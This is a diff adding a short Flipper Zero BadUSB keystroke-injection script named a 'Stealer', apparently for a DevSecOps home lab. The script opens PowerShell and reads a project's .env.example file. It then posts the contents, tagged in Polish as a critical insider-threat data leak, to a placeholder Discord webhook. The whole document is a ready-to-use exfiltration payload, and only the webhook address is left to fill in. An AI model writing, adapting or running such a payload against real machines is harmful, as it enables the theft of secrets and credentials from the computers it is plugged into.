@@ -1,0 +1,9 @@
+REM DevSecOps Flipper Zero Stealer
+DELAY 800
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 800
+STRING $content = Get-Content 'D:\PULPIT_D\DevSecOps-HomeLab\.env.example' -Raw; $payload = @{content="**KRYTYCZNY WYCIEK DANYCH (INSIDER THREAT):**`n$content`n"} | ConvertTo-Json; Invoke-RestMethod -Uri 'DISCORD_WEBHOOK' -Method Post -ContentType 'application/json' -Body $payload; exit
+ENTER
